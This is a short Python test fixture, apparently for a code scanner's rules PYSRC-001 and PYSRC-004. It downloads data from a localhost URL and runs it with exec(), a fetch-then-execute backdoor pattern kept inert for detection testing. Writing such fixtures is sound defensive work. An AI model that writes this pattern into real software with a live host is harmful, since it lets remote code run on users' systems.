# Fixture: PYSRC-001 + PYSRC-004. TrapDoor-style fetch-then-exec.
# The URL points to localhost so the fixture is inert; the pattern is what we detect.
import urllib.request
PAYLOAD = urllib.request.urlopen("http://127.0.0.1:0/synthetic").read()
exec(PAYLOAD)
